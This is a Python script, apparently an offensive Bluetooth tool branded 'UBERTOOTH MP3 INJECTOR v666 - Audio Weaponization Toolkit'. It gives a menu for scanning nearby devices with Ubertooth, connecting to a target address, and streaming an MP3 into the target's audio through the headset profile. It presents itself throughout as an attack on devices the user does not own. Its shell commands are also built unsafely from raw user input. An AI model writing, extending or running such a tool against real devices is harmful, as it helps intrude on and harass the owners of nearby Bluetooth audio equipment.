#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# UBERTOOTH MP3 INJECTOR v666 - Audio Weaponization Toolkit

import os
import sys
import subprocess
import time
from datetime import datetime
import signal
import colorama
from colorama import Fore, Style
import threading

colorama.init()

class UberAudioInjector:
    def __init__(self):
        self.running = True
        self.active_attacks = []
        signal.signal(signal.SIGINT, self.signal_handler)
        self.show_banner()

    def show_banner(self):
        os.system('clear')
        print(f"""{Fore.MAGENTA}
   ___ _ _ _   ___ ___ _____ ___ ___ 
  | _ | | | |_| _ ) _|_   _|_ _/ _ \\
  | _ |_  _|_  _) _| | |  | | (_) |
  |___| |_| |_| |_|___| |_| |_|\___/
                                     
 ------------------------------------
    UBERTOOTH MP3 INJECTOR v666
   "Your Bluetooth Audio Weapon"
 ------------------------------------
 • Live Audio Hijacking
 • MP3 Injection Attack
 • Always Showing Banner
 ------------------------------------
{Style.RESET_ALL}""")

    def signal_handler(self, sig, frame):
        print(f"\n{Fore.RED}💀 TERMINATING AUDIO ATTACKS!{Style.RESET_ALL}")
        self.cleanup()
        sys.exit(0)

    def cleanup(self):
        for proc in self.active_attacks:
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            except:
                pass
        os.system("pkill -f 'sox|aplay|hstest'")

    def convert_mp3_to_raw(self, mp3_file):
        """Convert MP3 to Bluetooth-compatible raw audio"""
        raw_file = "/tmp/inject.raw"
        print(f"{Fore.YELLOW}⚙️ Converting {mp3_file} to raw format...{Style.RESET_ALL}")
        os.system(f"sox '{mp3_file}' -r 8000 -c 1 -b 16 -e signed-integer {raw_file}")
        return raw_file

    def inject_audio(self, target_bdaddr, audio_file):
        """Inject audio to target device"""
        self.show_banner()
        print(f"{Fore.RED}🔊 PREPARING AUDIO INJECTION TO {target_bdaddr}{Style.RESET_ALL}")
        
        if audio_file.endswith('.mp3'):
            audio_file = self.convert_mp3_to_raw(audio_file)
        
        # Connect to target (HFP profile)
        print(f"{Fore.YELLOW}● Connecting to target...{Style.RESET_ALL}")
        os.system(f"bluetoothctl connect {target_bdaddr}")
        time.sleep(2)
        
        # Start injection
        print(f"{Fore.GREEN}● Streaming audio payload...{Style.RESET_ALL}")
        cmd = f"cat {audio_file} | hstest /dev/stdin -s 8000 -b 16 -c 1"
        self.run_attack(cmd, bg=True)
        
        print(f"\n{Fore.RED}● AUDIO INJECTION ACTIVE! (Press Enter to stop){Style.RESET_ALL}")
        input()
        self.cleanup()

    def run_attack(self, cmd, bg=False):
        try:
            proc = subprocess.Popen(cmd, shell=True,
                                  stdout=subprocess.PIPE,
                                  stderr=subprocess.PIPE,
                                  preexec_fn=os.setsid)
            if bg:
                self.active_attacks.append(proc)
            return proc
        except Exception as e:
            print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
            return None

    def main_menu(self):
        while self.running:
            self.show_banner()
            print(f"\n{Fore.CYAN}=== MAIN MENU ==={Style.RESET_ALL}")
            print(f"{Fore.GREEN}1. Scan for Bluetooth Devices{Style.RESET_ALL}")
            print(f"{Fore.RED}2. Inject MP3 to Target{Style.RESET_ALL}")
            print(f"{Fore.WHITE}3. Exit{Style.RESET_ALL}")
            
            choice = input("\nSelect option: ")
            
            if choice == "1":
                os.system("ubertooth-scan -t 15")
                input("\nPress Enter to continue...")
            elif choice == "2":
                target = input("Enter target BD_ADDR (e.g. 01:23:45:67:89:AB): ")
                mp3_file = input("Path to MP3 file: ")
                if not os.path.exists(mp3_file):
                    print(f"{Fore.RED}File not found!{Style.RESET_ALL}")
                    time.sleep(2)
                    continue
                self.inject_audio(target, mp3_file)
            elif choice == "3":
                self.running = False
            else:
                print(f"{Fore.RED}Invalid choice!{Style.RESET_ALL}")
                time.sleep(1)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print(f"{Fore.RED}Must be root! Run: sudo {sys.argv[0]}{Style.RESET_ALL}")
        sys.exit(1)
    
    # Check dependencies
    required = ['sox', 'hstest', 'bluetoothctl']
    missing = [cmd for cmd in required if not subprocess.getoutput(f"which {cmd}")]
    if missing:
        print(f"{Fore.RED}Missing dependencies: {', '.join(missing)}{Style.RESET_ALL}")
        sys.exit(1)
    
    injector = UberAudioInjector()
    try:
        injector.main_menu()
    except Exception as e:
        print(f"{Fore.RED}Critical error: {e}{Style.RESET_ALL}")
    finally:
        injector.cleanup()
